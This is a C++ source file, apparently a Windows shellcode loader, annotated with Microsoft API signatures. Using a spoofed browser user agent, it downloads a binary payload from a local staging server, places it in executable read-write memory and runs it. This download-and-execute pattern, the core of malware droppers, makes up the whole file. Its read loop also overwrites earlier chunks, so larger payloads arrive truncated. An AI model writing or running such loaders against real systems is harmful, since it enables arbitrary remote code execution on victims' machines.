#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>

// link winhttp library
#pragma comment(lib, "winhttp.lib")

int main() {
	//WINHTTPAPI HINTERNET WinHttpOpen(
	//	[in, optional] LPCWSTR pszAgentW,
	//	[in]           DWORD   dwAccessType,
	//	[in]           LPCWSTR pszProxyW,
	//	[in]           LPCWSTR pszProxyBypassW,
	//	[in]           DWORD   dwFlags
	//);
	// https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopen
	HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	//WINHTTPAPI HINTERNET WinHttpConnect(
	//	[in] HINTERNET     hSession,
	//	[in] LPCWSTR       pswzServerName,
	//	[in] INTERNET_PORT nServerPort,
	//	[in] DWORD         dwReserved
	//);
	// https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpconnect
	HINTERNET hConnect = WinHttpConnect(hSession, L"127.0.0.1", 8000, 0);

	//WINHTTPAPI HINTERNET WinHttpOpenRequest(
	//	[in] HINTERNET hConnect,
	//	[in] LPCWSTR   pwszVerb,
	//	[in] LPCWSTR   pwszObjectName,
	//	[in] LPCWSTR   pwszVersion,
	//	[in] LPCWSTR   pwszReferrer,
	//	[in] LPCWSTR * ppwszAcceptTypes,
	//	[in] DWORD     dwFlags
	//);
	// https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopenrequest
	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/data.bin",
		NULL,
		WINHTTP_NO_REFERER,
		WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

	//WINHTTPAPI BOOL WinHttpSendRequest(
	//	[in]           HINTERNET hRequest,
	//	[in, optional] LPCWSTR   lpszHeaders,
	//	[in]           DWORD     dwHeadersLength,
	//	[in, optional] LPVOID    lpOptional,
	//	[in]           DWORD     dwOptionalLength,
	//	[in]           DWORD     dwTotalLength,
	//	[in]           DWORD_PTR dwContext
	//);
	// https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpsendrequest
	BOOL bResults = WinHttpSendRequest(hRequest,
		WINHTTP_NO_ADDITIONAL_HEADERS, 0,
		WINHTTP_NO_REQUEST_DATA, 0,
		0, 0);

	//WINHTTPAPI BOOL WinHttpReceiveResponse(
	//	[in] HINTERNET hRequest,
	//	[in] LPVOID    lpReserved
	//);
	// https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpreceiveresponse
	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);

	// iniitalize variables
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	std::vector<char> buffer;
	BOOL bDone = FALSE;

	if (bResults) {
		do {

			dwSize = 0;
			//WINHTTPAPI BOOL WinHttpQueryDataAvailable(
			//	[in]  HINTERNET hRequest,
			//	[out] LPDWORD   lpdwNumberOfBytesAvailable
			//);
			// https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpquerydataavailable
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
				// handle error here.
				break;
			}

			if (dwSize == 0) break;

			buffer.resize(dwSize);

			ZeroMemory(&buffer[0], dwSize);

			//WINHTTPAPI BOOL WinHttpReadData(
			//	[in]  HINTERNET hRequest,
			//	[out] LPVOID    lpBuffer,
			//	[in]  DWORD     dwNumberOfBytesToRead,
			//	[out] LPDWORD   lpdwNumberOfBytesRead
			//);
			// https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpreaddata
			if (!WinHttpReadData(hRequest, (LPVOID)&buffer[0], dwSize, &dwDownloaded)) {
				break;
			}

		} while (dwSize > 0);
		//LPVOID VirtualAlloc(
		//	[in, optional] LPVOID lpAddress, 
		//	[in]           SIZE_T dwSize,
		//	[in]           DWORD  flAllocationType,
		//	[in]           DWORD  flProtect
		//);
		// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
		void* exec = VirtualAlloc(
			0,
			buffer.size() + 1,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE);

		// https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=msvc-170
		memcpy(
			exec,
			buffer.data(),
			buffer.size());

		((void(*)())exec)();
	}

	//WINHTTPAPI BOOL WinHttpCloseHandle(
	//	[in] HINTERNET hInternet
	//);
	// https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpclosehandle
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);

	return 0;

}